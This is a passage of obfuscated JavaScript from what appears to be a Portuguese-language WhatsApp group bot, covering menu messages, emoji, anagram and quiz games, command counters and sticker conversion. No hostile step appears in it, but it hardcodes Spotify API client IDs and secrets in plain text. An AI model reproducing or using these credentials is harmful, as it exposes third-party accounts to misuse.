          async function _0x2e4fa0(_0x319bf5, _0x1ac926, _0x529013, _0x103212, _0x10aba4, _0x524929) {
            imagePath = await _0x1dcb6b(_0x1ac926);
            imageBuffer = fs.readFileSync(imagePath);
            const _0x489e8d = {
              image: imageBuffer
            };
            const _0x534541 = {
              upload: _0x5196be.waUploadToServer
            };
            let _0x4ae865 = await prepareWAMessageMedia(_0x489e8d, _0x534541);
            sections = _0x524929.map(_0x2454f8 => ({
              'title': _0x2cd689 + " MENU DE COMANDOS " + _0x2cd689,
              'rows': [{
                'header': '',
                'title': _0x2454f8.title,
                'description': _0x2454f8.descrip !== undefined ? _0x2454f8.descrip : NomeDoBot,
                'id': '' + (_0x10aba4 + _0x2454f8.id)
              }]
            }));
            const _0x5d1321 = {
              title: _0x529013,
              sections: sections
            };
            buttonParams = JSON.stringify(_0x5d1321);
            const _0x42d455 = {
              hasMediaAttachment: true,
              imageMessage: _0x4ae865.imageMessage
            };
            const _0x16ebca = {
              text: _0x103212
            };
            const _0x26d08f = {
              header: _0x42d455,
              headerType: "IMAGE",
              body: _0x16ebca,
              nativeFlowMessage: {}
            };
            _0x26d08f.nativeFlowMessage.buttons = [{
              'name': "single_select",
              'buttonParamsJson': buttonParams
            }];
            _0x26d08f.nativeFlowMessage.messageParamsJson = '';
            const _0x185bdd = {
              interactiveMessage: _0x26d08f
            };
            await _0x5196be.relayMessage(_0x319bf5, _0x185bdd, {});
            fs.unlinkSync(imagePath);
          }
          async function _0x58c3cd(_0x5095f, _0x9c62a5, _0x4ed59b, _0x16e42b, _0x414761) {
            xablaub = true;
            if (xablaub) {
              sections = _0x414761.map(_0x1b7599 => ({
                'title': '',
                'highlight_label': _0x1b7599.stts,
                'rows': [{
                  'header': '',
                  'title': _0x1b7599.title,
                  'description': _0x1b7599.descrip !== undefined ? _0x1b7599.descrip : NomeDoBot,
                  'id': '' + (_0x16e42b + _0x1b7599.id)
                }]
              }));
              const _0x4f972d = {
                title: _0x9c62a5,
                sections: sections
              };
              buttonParams = JSON.stringify(_0x4f972d);
              const _0x37ecde = {
                text: _0x4ed59b
              };
              const _0x37e09e = {
                name: "single_select",
                buttonParamsJson: buttonParams
              };
              const _0x535362 = {
                buttons: [_0x37e09e],
                messageParamsJson: ''
              };
              const _0x3d6e72 = {
                body: _0x37ecde,
                nativeFlowMessage: _0x535362
              };
              const _0x194378 = {
                interactiveMessage: _0x3d6e72
              };
              await _0x5196be.relayMessage(_0x5095f, _0x194378, {});
            } else {
              _0x50740b("comando bloqueado");
            }
          }
          async function _0x4d7e0d(_0x1b43d8, _0x59f2e8, _0x3d5801, _0x1dcf25, _0x438303) {
            imagePath = await _0x1dcb6b(_0x59f2e8);
            imageBuffer = fs.readFileSync(imagePath);
            const _0x4b7545 = {
              video: imageBuffer
            };
            const _0x2b1ef7 = {
              upload: _0x5196be.waUploadToServer
            };
            let _0x2ea464 = await prepareWAMessageMedia(_0x4b7545, _0x2b1ef7);
            sections = _0x438303.map(_0x3535eb => ({
              'title': '',
              'rows': [{
                'header': '',
                'title': _0x3535eb.title,
                'description': _0x3535eb.descrip !== undefined ? _0x3535eb.descrip : NomeDoBot,
                'id': '' + (_0x141936 + _0x3535eb.id)
              }]
            }));
            const _0x5e9168 = {
              title: _0x3d5801,
              sections: sections
            };
            buttonParams = JSON.stringify(_0x5e9168);
            const _0x4e23db = {
              hasMediaAttachment: true,
              videoMessage: _0x2ea464.videoMessage
            };
            const _0x1dcefb = {
              text: _0x1dcf25
            };
            const _0xee5818 = {
              header: _0x4e23db,
              headerType: "IMAGE",
              body: _0x1dcefb,
              nativeFlowMessage: {}
            };
            _0xee5818.nativeFlowMessage.buttons = [{
              'name': "single_select",
              'buttonParamsJson': buttonParams
            }];
            _0xee5818.nativeFlowMessage.messageParamsJson = '';
            const _0x4de50b = {
              interactiveMessage: _0xee5818
            };
            await _0x5196be.relayMessage(_0x1b43d8, _0x4de50b, {});
            fs.unlinkSync(imagePath);
          }
          async function _0x384360(_0x35a78d, _0x409a57, _0x4cf22d) {
            try {
              let _0x464505 = _0x4cf22d.map(_0x216924 => ({
                'name': _0x216924.type,
                'buttonParamsJson': JSON.stringify({
                  'display_text': _0x216924.texto,
                  'id': _0x216924.id,
                  'url': _0x216924.url || '',
                  'merchant_url': _0x216924.merchant_url || '',
                  'copy_code': _0x216924.copy_code || '',
                  'disabled': _0x216924.disabled || false
                })
              }));
              const _0x2f2707 = {
                text: _0x409a57
              };
              const _0x17e9ef = {
                participant: _0x246d48,
                mentionedJid: [_0x246d48]
              };
              const _0x278971 = {
                buttons: _0x464505,
                messageParamsJson: ''
              };
              const _0x3ee6c2 = {
                body: _0x2f2707,
                contextInfo: _0x17e9ef,
                nativeFlowMessage: _0x278971
              };
              const _0x32dd51 = {
                interactiveMessage: _0x3ee6c2
              };
              await _0x5196be.relayMessage(_0x35a78d, _0x32dd51, {});
            } catch (_0x108c01) {
              _0x50740b(_0x108c01);
            }
          }
          async function _0x842313(_0x2cb888, _0x2a948e, _0x9ffb9c, _0xfa81b5) {
            try {
              imagePath = await _0x1dcb6b(_0x2a948e);
              imageBuffer = fs.readFileSync(imagePath);
              const _0x205234 = {
                image: imageBuffer
              };
              const _0x48d27a = {
                upload: _0x5196be.waUploadToServer
              };
              let _0x4a2946 = await prepareWAMessageMedia(_0x205234, _0x48d27a);
              let _0x150041 = _0xfa81b5.map(_0x10d2d4 => ({
                'name': _0x10d2d4.type,
                'buttonParamsJson': JSON.stringify({
                  'display_text': _0x10d2d4.texto,
                  'id': _0x10d2d4.id,
                  'url': _0x10d2d4.url || '',
                  'merchant_url': _0x10d2d4.merchant_url || '',
                  'copy_code': _0x10d2d4.copy_code || '',
                  'disabled': _0x10d2d4.disabled || false
                })
              }));
              const _0xcb2da5 = {
                hasMediaAttachment: true,
                imageMessage: _0x4a2946.imageMessage
              };
              const _0x44afe6 = {
                text: _0x9ffb9c
              };
              const _0x34f8b5 = {
                buttons: _0x150041,
                messageParamsJson: ''
              };
              const _0x6c142b = {
                header: _0xcb2da5,
                headerType: "IMAGE",
                body: _0x44afe6,
                nativeFlowMessage: _0x34f8b5
              };
              const _0x36995c = {
                interactiveMessage: _0x6c142b
              };
              await _0x5196be.relayMessage(_0x2cb888, _0x36995c, {});
            } catch (_0x2a2d37) {
              console.log(_0x2a2d37);
            }
          }
          async function _0x58e9c9(_0x27a34e, _0x220ddc, _0x84a257, _0xd541cd) {
            try {
              let _0x1df3ad = await _0x1dcb6b(_0x220ddc);
              let _0x528f80 = fs.readFileSync(_0x1df3ad);
              const _0x34c357 = {
                video: _0x528f80
              };
              const _0x41ba82 = {
                upload: _0x5196be.waUploadToServer
              };
              let _0x283ca8 = await prepareWAMessageMedia(_0x34c357, _0x41ba82);
              let _0x53792d = _0xd541cd.map(_0x263086 => ({
                'name': _0x263086.type,
                'buttonParamsJson': JSON.stringify({
                  'display_text': _0x263086.texto,
                  'id': _0x263086.id,
                  'url': _0x263086.url || '',
                  'merchant_url': _0x263086.merchant_url || '',
                  'copy_code': _0x263086.copy_code || '',
                  'disabled': _0x263086.disabled || false
                })
              }));
              const _0x504be1 = {
                hasMediaAttachment: true,
                videoMessage: _0x283ca8.videoMessage
              };
              const _0x5f3388 = {
                text: _0x84a257
              };
              const _0x26a817 = {
                buttons: _0x53792d,
                messageParamsJson: ''
              };
              const _0x3b7dbd = {
                header: _0x504be1,
                headerType: "IMAGE",
                body: _0x5f3388,
                nativeFlowMessage: _0x26a817
              };
              const _0x256cab = {
                interactiveMessage: _0x3b7dbd
              };
              await _0x5196be.relayMessage(_0x27a34e, _0x256cab, {});
            } catch (_0xb04cba) {
              _0x50740b(_0xb04cba);
            }
          }
          function _0x3745b2(_0x4e62c5) {
            let [_0x56e2d8, _0x15af18, _0xaf496e] = _0x4e62c5.split('/').map(Number);
            let _0x36af77 = new Date(_0xaf496e, _0x15af18 - 1, _0x56e2d8);
            return Math.floor(_0x36af77.getTime() / 1000);
          }
          const _0x4d949a = require("./DADOS/json/emojis.json");
          const _0x265e03 = JSON.parse(fs.readFileSync("./DADOS/json/messageData.json"));
          function _0x46bfa3(_0x2ce5d4) {
            let _0x570b15 = _0x265e03.find(_0x55e8fe => _0x55e8fe.grupo === _0x2ce5d4);
            return _0x570b15;
          }
          async function _0x233934() {
            let _0x4c5431 = JSON.parse(fs.readFileSync("./DADOS/json/emojis.json"));
            let _0x8ba693 = _0x4c5431[0].emojis;
            let _0x170b03 = Object.keys(_0x8ba693);
            let _0x9063a8 = _0x170b03[Math.floor(Math.random() * _0x170b03.length)];
            const _0x127e07 = {
              text: "Adivinhe o nome do emoji: " + _0x8ba693[_0x9063a8]
            };
            _0x5196be.sendMessage(_0x346d97, _0x127e07);
            _0x326cbd[0].adivinheemoji = true;
            _0x326cbd[0].adivinheEmoji = _0x9063a8;
            _0x137e44(_0x326cbd);
            SbE2 = _0x9063a8;
            var _0x29c236 = setInterval(() => {
              var _0xe7724a = _0x89cd51 ? JSON.parse(fs.readFileSync(_0x25975c)) : undefined;
              if (_0xe7724a[0].adivinheEmoji && _0xe7724a[0].adivinheEmoji == _0x9063a8) {
                SbE2 = false;
                _0x326cbd[0].adivinheemoji = false;
                _0x326cbd[0].adivinheEmoji = false;
                _0x137e44(_0x326cbd);
              }
              clearInterval(_0x29c236);
            }, 300000);
          }
          if (_0x53418e && _0x326cbd[0].adivinheEmoji && _0x5725b4.toLowerCase() === _0x326cbd[0].adivinheEmoji) {
            await _0x50740b("Parabéns! Você acertou. Irei enviar o próximo...");
            _0x326cbd[0].adivinheEmoji = false;
            _0x233934();
            let _0x2d0794 = JSON.parse(fs.readFileSync("./DADOS/json/rankemoji.json"));
            let _0x21aff9 = _0x2d0794.findIndex(_0xa6a55f => _0xa6a55f.grupo === _0x346d97);
            if (_0x21aff9 === -1) {
              const _0x47a892 = {
                grupo: _0x346d97,
                usuarios: []
              };
              _0x2d0794.push(_0x47a892);
              _0x21aff9 = _0x2d0794.length - 1;
            }
            let _0x545c3c = _0x2d0794[_0x21aff9].usuarios.findIndex(_0x5b5d8b => _0x5b5d8b.usuario === _0x246d48);
            if (_0x545c3c === -1) {
              const _0x3024ff = {
                usuario: _0x246d48,
                pontos: 0x1
              };
              _0x2d0794[_0x21aff9].usuarios.push(_0x3024ff);
            } else {
              _0x2d0794[_0x21aff9].usuarios[_0x545c3c].pontos++;
            }
            fs.writeFileSync("./DADOS/json/rankemoji.json", JSON.stringify(_0x2d0794));
          }
          function _0x2c9f11(_0x39c9cf) {
            var _0x172c1e = /^[0-9]+$/;
            if (_0x39c9cf.match(_0x172c1e)) {
              return true;
            } else {
              return false;
            }
          }
          function _0x4d0c5b(_0x4a024b) {
            return _0x4a024b.replace(/\D/g, '');
          }
          const _0x14ab06 = JSON.parse(fs.readFileSync("./DADOS/json/countcmd.json"));
          var _0x1de7f6 = [];
          var _0x14044d = [];
          if (_0x1d6d9e) {
            _0x53879e(_0x346d97, _0x267d4b, _0x3baffe, _0x1d6d9e);
          } else {
            _0x2a0803(_0x346d97, _0x3baffe, _0x1d6d9e);
          }
          _0x2e8624(_0x346d97, _0x3baffe);
          function _0x911bb3() {
            try {
              let _0x5b1ebd = fs.readFileSync("./DADOS/json/countcmd.json", "utf8");
              _0x14ab06 = JSON.parse(_0x5b1ebd);
            } catch (_0x5c86e5) {
              _0x14ab06 = [];
            }
          }
          function _0x5ce4e7() {
            fs.writeFileSync("./DADOS/json/countcmd.json", JSON.stringify(_0x14ab06, null, 2));
          }
          function _0x53879e(_0x3d5e07, _0x66cd9f, _0xf7337f) {
            let _0x8ed5cd = -1;
            for (let _0x148c22 = 0; _0x148c22 < _0x14ab06.length; _0x148c22++) {
              if (_0x14ab06[_0x148c22].grupo === _0x3d5e07) {
                _0x8ed5cd = _0x148c22;
                break;
              }
            }
            if (_0x8ed5cd === -1) {
              const _0x8a6b66 = {
                _0x66cd9f: 1
              };
              const _0x405d24 = {
                grupo: _0x3d5e07,
                nome: _0xf7337f,
                comandos: _0x8a6b66,
                mensagens: 0x0
              };
              _0x14ab06.push(_0x405d24);
            } else {
              if (!_0x14ab06[_0x8ed5cd].comandos[_0x66cd9f]) {
                _0x14ab06[_0x8ed5cd].comandos[_0x66cd9f] = 1;
              } else {
                _0x14ab06[_0x8ed5cd].comandos[_0x66cd9f]++;
              }
            }
            _0x5ce4e7();
          }
          function _0x2a0803(_0x1ccf16, _0x3c5906, _0x2633ee) {
            let _0x323d82 = -1;
            for (let _0x28771a = 0; _0x28771a < _0x14ab06.length; _0x28771a++) {
              if (_0x14ab06[_0x28771a].grupo === _0x1ccf16) {
                _0x323d82 = _0x28771a;
                break;
              }
            }
            if (_0x323d82 === -1) {
              const _0x4f3efe = {
                grupo: _0x1ccf16,
                nome: _0x3c5906,
                comandos: {},
                mensagens: 0x1
              };
              _0x14ab06.push(_0x4f3efe);
            } else {
              _0x14ab06[_0x323d82].mensagens++;
            }
            _0x5ce4e7();
          }
          function _0x2e8624(_0x44b9b6, _0x5571eb) {
            if (!_0x1de7f6.includes(_0x44b9b6)) {
              _0x1de7f6.push(_0x44b9b6);
              let _0x3ace5f = _0x14ab06.findIndex(_0x3a6bac => _0x3a6bac.grupo === _0x44b9b6);
              if (_0x3ace5f === -1) {
                const _0xb0629 = {
                  grupo: _0x44b9b6,
                  nome: _0x5571eb,
                  comandos: {},
                  mensagens: 0x0
                };
                _0x14ab06.push(_0xb0629);
              } else {
                _0x14ab06[_0x3ace5f].nome = _0x5571eb;
              }
              _0x5ce4e7();
            }
          }
          function _0xc1b0ff(_0x1f9d4c) {
            return _0x1de7f6.includes(_0x1f9d4c);
          }
          function _0x19a91a(_0x2163ec) {
            return _0x14044d.map(_0x482611 => _0x482611.command).includes(_0x2163ec);
          }
          const _0x39d764 = async _0x3f1267 => {
            const _0x58e1aa = require("spotifydl-core")["default"];
            const _0x2d0618 = {
              clientId: "acc6302297e040aeb6e4ac1fbdfd62c3",
              clientSecret: "0e8439a1280a43aba9a5bc0a16f3f009"
            };
            const _0x5f1053 = new _0x58e1aa(_0x2d0618);
            try {
              let _0x5db829 = await _0x5f1053.downloadTrack(_0x3f1267);
              if (_0x5db829) {
                return _0x5db829;
              } else {
                throw new Error("Não foi possível baixar a música do Spotify.");
              }
            } catch (_0x2deb90) {
              throw new Error("Ocorreu um erro ao baixar a música do Spotify.");
            }
          };
          const _0x48f566 = async _0x140a3a => {
            const _0x36f243 = require("spotify-finder");
            const _0xfb79ae = {
              key: "271f6e790fb943cdb34679a4adcc34cc",
              secret: "c009525564304209b7d8b705c28fd294"
            };
            const _0x574ce0 = {
              consumer: _0xfb79ae
            };
            const _0x24fcaf = new _0x36f243(_0x574ce0);
            try {
              let _0x2be86d = _0x140a3a.split('/').pop();
              let _0xdccadb = await _0x24fcaf.getTrack(_0x2be86d);
              if (_0xdccadb) {
                return {
                  'name': _0xdccadb.name,
                  'artists': _0xdccadb.artists.map(_0x656449 => _0x656449.name),
                  'album': _0xdccadb.album.name,
                  'release_date': _0xdccadb.album.release_date,
                  'popularity': _0xdccadb.popularity,
                  'url': _0xdccadb.external_urls.spotify,
                  'thumbnail': _0xdccadb.album.images.length > 0 ? _0xdccadb.album.images[0].url : null
                };
              } else {
                throw new Error("Não foi possível encontrar informações da música no Spotify.");
              }
            } catch (_0x318367) {
              throw new Error("Ocorreu um erro ao buscar informações da música no Spotify.");
            }
          };
          const _0x1ac627 = require("form-data");
          const {
            JSDOM: _0x1168dc
          } = require("jsdom");
          async function _0x57ae2b(_0x22e074) {
            let _0xc07587 = new _0x1ac627();
            _0xc07587.append("new-image-url", '');
            _0xc07587.append("new-image", _0x22e074, "image.webp");
            let _0x5506bb = await fetch("https://ezgif.com/webp-to-mp4", {
              'method': "POST",
              'body': _0xc07587
            });
            let _0x1ea563 = await _0x5506bb.text();
            let {
              document: _0x46f95c
            } = new _0x1168dc(_0x1ea563).window;
            let _0x38407e = new _0x1ac627();
            let _0x2dbcc = {};
            for (let _0x3f688a of _0x46f95c.querySelectorAll("form input[name]")) {
              _0x2dbcc[_0x3f688a.name] = _0x3f688a.value;
              _0x38407e.append(_0x3f688a.name, _0x3f688a.value);
            }
            let _0xfd1170 = await fetch("https://ezgif.com/webp-to-mp4/" + _0x2dbcc.file, {
              'method': "POST",
              'body': _0x38407e
            });
            let _0x3dd1a6 = await _0xfd1170.text();
            let {
              document: _0xef3051
            } = new _0x1168dc(_0x3dd1a6).window;
            return new URL(_0xef3051.querySelector("div#output > p.outfile > video > source").src, _0xfd1170.url).toString();
          }
          function _0xda5651(_0x288e82, _0x153f9f) {
            let _0x50eb37 = premium.includes(_0x288e82);
            let _0x50aeae = premium.includes(_0x153f9f);
            if (!_0x50eb37) {
              premium.push(_0x288e82);
              fs.writeFileSync("./DADOS/json/premium.json", JSON.stringify(premium));
              console.log("Player1 (" + _0x288e82 + ") recebeu premium por 15 segundos.");
              let _0x22f784 = {
                'expirationTime': Date.now() + 30000
              };
              fs.writeFileSync("./DADOS/json/remocaoPlayer1Timeout.json", JSON.stringify(_0x22f784));
            }
            if (!_0x50aeae) {
              premium.push(_0x153f9f);
              fs.writeFileSync("./DADOS/json/premium.json", JSON.stringify(premium));
              console.log("Player2 (" + _0x153f9f + ") recebeu premium por 15 segundos.");
              let _0x2b63ba = {
                'expirationTime': Date.now() + 30000
              };
              fs.writeFileSync("./DADOS/json/remocaoPlayer2Timeout.json", JSON.stringify(_0x2b63ba));
            }
          }
          const {
            getMinesPositions: _0x3373c3,
            MinesHelp: _0x57d916
          } = require("./DADOS/json/mines");
          const _0x3a2927 = JSON.parse(fs.readFileSync("./DADOS/json/mines.json"));
          var _0x5cfdbf = ['a1', 'a2', 'a3', 'a4', 'a5', 'b1', 'b2', 'b3', 'b4', 'b5', 'c1', 'c2', 'c3', 'c4', 'c5', 'd1', 'd2', 'd3', 'd4', 'd5', 'e1', 'e2', 'e3', 'e4', 'e5'];
          var _0x526ac1 = [];
          for (let _0x53f842 of _0x3a2927) _0x526ac1.push(_0x53f842.id);
          const _0x4b8e82 = _0x526ac1.includes(_0x346d97);
          function _0x41fcf4(_0x316009) {
            nomeArquivo = "dados_" + Date.now() + '_' + Math.floor(Math.random() * 100000) + ".json";
            const _0x226bb3 = {
              data: _0x316009
            };
            json = _0x226bb3;
            jsonString = JSON.stringify(json);
            caminhoCompleto = path.join(__dirname, nomeArquivo);
            fs.writeFileSync(caminhoCompleto, jsonString);
            jsonStringRecuperada = fs.readFileSync(caminhoCompleto, "utf8");
            jsonRecuperado = JSON.parse(jsonStringRecuperada);
            setTimeout(() => {
              fs.unlinkSync(caminhoCompleto);
            }, 1000);
            return jsonRecuperado.data;
          }
          function _0x257290(_0xd01914) {
            if (_0xd01914.type == "gif") {
              const _0x30ba2e = {
                url: _0xd01914.url
              };
              const _0x570a67 = {
                video: _0x30ba2e,
                gifPlayback: true
              };
              return _0x570a67;
            } else {
              if (_0xd01914.type == "video") {
                const _0x5bb437 = {
                  url: _0xd01914.url
                };
                const _0x469cff = {
                  video: _0x5bb437
                };
                return _0x469cff;
              } else {
                const _0x5b9d4a = {
                  url: _0xd01914.url
                };
                const _0x521b79 = {
                  image: _0x5b9d4a
                };
                return _0x521b79;
              }
            }
          }
          const _0x125a55 = async (_0x408780, _0x362d82) => {
            try {
              var _0x429d4a = Date.now() / 10000;
              var _0x5079d5 = function (_0x902b0d, _0x111a31, _0x376118) {
                request.head(_0x902b0d, function (_0x1b649e, _0x30fe18, _0x199759) {
                  request(_0x902b0d).pipe(fs.createWriteStream(_0x111a31)).on("close", _0x376118);
                });
              };
              _0x5079d5(_0x362d82, "./sticker" + _0x429d4a + ".png", async function () {
                console.log("enviando sticker");
                let _0x1c190e = "./sticker" + _0x429d4a + ".png";
                let _0x5e9b46 = "./sticker" + _0x429d4a + ".webp";
                exec("ffmpeg -i " + _0x1c190e + " -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 " + _0x5e9b46, _0x5444d8 => {
                  let _0x4a8ff7 = fs.readFileSync(_0x5e9b46);
                  const _0x5a9fa0 = {
                    sticker: _0x4a8ff7
                  };
                  const _0x49b3c7 = {
                    forwardingScore: 0x32,
                    isForwarded: true
                  };
                  const _0x4b10ac = {
                    sendEphemeral: true,
                    contextInfo: _0x49b3c7,
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x408780, _0x5a9fa0, _0x4b10ac)["catch"](_0x25348f => {
                    return _0x50740b("Erro..");
                  });
                  DLT_FL(_0x1c190e);
                  DLT_FL(_0x5e9b46);
                });
              });
            } catch {
              return _0x50740b("Erro.. FNC");
            }
          };
          let _0x3c8d1e = JSON.parse(fs.readFileSync("./DADOS/json/rankana.json"));
          if (_0x89cd51 && fs.existsSync("./DADOS/json/anagrama-" + _0x346d97 + ".json")) {
            let _0x30ef9b = JSON.parse(fs.readFileSync("./DADOS/json/anagrama-" + _0x346d97 + ".json"));
            if (_0x3a0a2c.slice(0, 4).toUpperCase() == _0x30ef9b.original.slice(0, 4).toUpperCase() && _0x3a0a2c.toUpperCase() != _0x30ef9b.original) {
              return _0x50740b("está perto");
            }
            xp = Math.floor(Math.random() * 14) + 3000;
            const _0x1549a7 = {
              users: {}
            };
            if (!_0x3c8d1e[_0x346d97]) {
              _0x3c8d1e[_0x346d97] = _0x1549a7;
            }
            const _0x5d8251 = {
              wins: 0x0
            };
            if (!_0x3c8d1e[_0x346d97].users[_0x246d48]) {
              _0x3c8d1e[_0x346d97].users[_0x246d48] = _0x5d8251;
            }
            if (_0x3a0a2c.toUpperCase() == _0x30ef9b.original) {
              if (_0x3c8d1e[_0x346d97].users[_0x246d48].wins === 0) {
                _0x3c8d1e[_0x346d97].users[_0x246d48].wins++;
                fs.writeFileSync("./DADOS/json/rankana.json", JSON.stringify(_0x3c8d1e, null, 2));
                const _0x20def3 = {
                  text: "parabéns " + _0x671b4b + " 🥳 você ganhou o jogo\nPalavra : " + _0x30ef9b.original + "\nIniciando o próximo jogo em 5 segundos..."
                };
                const _0x42a574 = {
                  mentionedJid: [_0x246d48]
                };
                _0x5196be.sendMessage(_0x346d97, _0x20def3, _0x42a574);
              } else {
                _0x3c8d1e[_0x346d97].users[_0x246d48].wins++;
                fs.writeFileSync("./DADOS/json/rankana.json", JSON.stringify(_0x3c8d1e, null, 2));
              }
              setTimeout(async () => {
                let _0x585332 = palavrasANA[Math.floor(Math.random() * palavrasANA.length)];
                let _0x402a8c = JSON.stringify(_0x585332);
                fs.writeFileSync("./DADOS/json/anagrama-" + _0x346d97 + ".json", _0x402a8c);
                let _0x20cb3e = JSON.parse(_0x402a8c);
                const _0x30d797 = {
                  text: "╭─────≽「 👾 ANAGRAMA 👾 」\n│➽ DESCUBRA A PALAVRA\n│➽ ANAGRAMA: " + _0x20cb3e.embaralhada + "\n│➽ DICA: " + _0x20cb3e.dica + "\n╰────────────────────────"
                };
                _0x5196be.sendMessage(_0x346d97, _0x30d797);
              }, 5000);
            }
          }
          if (_0x89cd51 && fs.existsSync("./DADOS/json/quizanim-" + _0x346d97 + ".json")) {
            let _0x21c447 = JSON.parse(fs.readFileSync("./DADOS/json/quizanim-" + _0x346d97 + ".json"));
            if (_0x3a0a2c.slice(0, 4).toUpperCase() == _0x21c447.original.slice(0, 4).toUpperCase() && _0x3a0a2c.toUpperCase() != _0x21c447.original) {
              return _0x50740b("está perto");
            }
            if (_0x3a0a2c.toUpperCase() == _0x21c447.original) {
              const _0x15840a = {
                text: "Parabéns " + _0x671b4b + " você acertou\n" + _0x21c447.original + "\nProximo em 5 segundos..."
              };
              const _0xfd1f5b = {
                mentionedJid: [_0x246d48]
              };
              _0x5196be.sendMessage(_0x346d97, _0x15840a, _0xfd1f5b);
              fs.unlinkSync("./DADOS/json/quizanim-" + _0x346d97 + ".json");
              setTimeout(async () => {
                fs.writeFileSync("./DADOS/json/quizanim-" + _0x346d97 + ".json", '' + JSON.stringify(quizanimais[Math.floor(Math.random() * quizanimais.length)]));
                let _0x38491f = JSON.parse(fs.readFileSync("./DADOS/json/quizanim-" + _0x346d97 + ".json"));
                imagemtexto = "「 Show do Milhão 」";
                const _0x1b35b0 = {
                  url: _0x38491f.foto
                };
                const _0x975193 = {
                  image: _0x1b35b0,
                  caption: imagemtexto,
                  thumbnail: blalogoofc
                };
                const _0x537f7e = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x975193, _0x537f7e);
              }, 5000);
            }
          }
          const _0xfefbae = _0x4c3ee0 == "imageMessage";
          const _0x42f7da = _0x4c3ee0 == "videoMessage";
          const _0x36f2ae = _0x4c3ee0 == "audioMessage";
          const _0x42baf4 = _0x4c3ee0 == "stickerMessage";
          const _0x141660 = _0x4c3ee0 == "contactMessage";
          const _0x2d7129 = _0x4c3ee0 == "locationMessage";
          const _0x587ec8 = _0x4c3ee0 == "productMessage";
          const _0x39e519 = _0x4c3ee0 === "imageMessage" || _0x4c3ee0 === "videoMessage" || _0x4c3ee0 === "audioMessage" || _0x4c3ee0 == "viewOnceMessage" || _0x4c3ee0 == "viewOnceMessageV2";
          typeMessage = _0x3ac611.substr(0, 50).replace(/\n/g, '');
          if (_0xfefbae) {
            typeMessage = "Image";
          } else {
            if (_0x42f7da) {
              typeMessage = "Video";
            } else {
              if (_0x36f2ae) {
                typeMessage = "Audio";
              } else {
                if (_0x42baf4) {
                  typeMessage = "Sticker";
                } else {
                  if (_0x141660) {
                    typeMessage = "Contact";
                  } else {
                    if (_0x2d7129) {
                      typeMessage = "Location";
                    } else {
                      if (_0x587ec8) {
                        typeMessage = "Product";
                      }
                    }
                  }
                }
              }
            }
          }
          const _0x101cab = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("conversation");
          const _0x2e48e2 = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("text");
          const _0x54198a = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("imageMessage");
          const _0xee3727 = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("videoMessage");
          const _0x47f03c = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("documentMessage");
          const _0x210554 = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("documentWithCaptionMessage");
          const _0x2f2cdc = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("audioMessage");
          const _0x309ffb = _0x4c3ee0 === "extendedTextMessage" && _0x7bbd45.includes("stickerMessage");
          if (_0x89cd51) {
            const _0x340daf = getComandos(_0x346d97);
            if (_0x340daf === undefined) {
              addComandosId(_0x346d97);
            }
          }
          if (_0x89cd51 && _0x1d6d9e && !_0xf59944 && !_0x3eefd0 && getComandoBlock(_0x346d97).includes(_0x267d4b)) {
            return _0x50740b("comando blockeado");
          }
          if (_0x4a11c3) {
            if (_0x89cd51 && _0xd2050d.message?.["reactionMessage"]?.["text"]) {
              console.log(colors.brightCyan("\n╔┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╗\n║\n║ 〔 " + colors.brightBlue("USUÁRIO") + " 〕: 「 " + colors.brightBlue('' + _0x671b4b) + " 」\n║\n║ 〔 " + colors.brightMagenta("NÚMERO") + " 〕:「 " + colors.brightMagenta(_0x246d48.split('@')[0]) + " 」\n║\n║ 〔 " + (_0x89cd51 ? colors.brightRed("GRUPO") : colors.brightMagenta("PRIVADO")) + " 〕" + (_0x89cd51 ? "〔 " + colors.brightRed(_0x3baffe) + " 〕" : '') + "\n║\n║ 〔 REAÇÃO 〕: 〔 " + _0xd2050d.message.reactionMessage.text + " 〕\n║\n╚┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╝"));
            } else {
              if (_0x89cd51 && !_0x1d6d9e) {
                console.log(colors.brightCyan("\n╔┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╗\n║\n║ 〔 " + colors.brightBlue("USUÁRIO") + " 〕: 「 " + colors.brightBlue('' + _0x671b4b) + " 」\n║\n║ 〔 " + colors.brightMagenta("NÚMERO") + " 〕:「 " + colors.brightMagenta(_0x246d48.split('@')[0]) + " 」\n║\n║ 〔 " + colors.brightRed("GRUPO") + " 〕:「 " + colors.brightRed(_0x3baffe) + " 」\n║\n╚┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╝"));
              } else {
                if (_0x1d6d9e && !_0x89cd51) {
                  console.log(colors.brightCyan("\n╔┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╗\n║\n║ 〔 " + colors.brightBlue("USUÁRIO") + " 〕: 「 " + colors.brightBlue('' + _0x671b4b) + " 」\n║\n║ 〔 " + colors.brightMagenta("NÚMERO") + " 〕:「 " + colors.brightMagenta(_0x246d48.split('@')[0]) + " 」\n║\n║ 「 " + colors.brightRed("PRIVADO") + " 」\n║\n║ 〔 " + colors.brightGreen("COMANDO") + " 〕 :「 " + colors.brightGreen('' + _0x267d4b) + " 」\n║\n╚┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╝  "));
                } else {
                  if (_0x1d6d9e && _0x89cd51) {
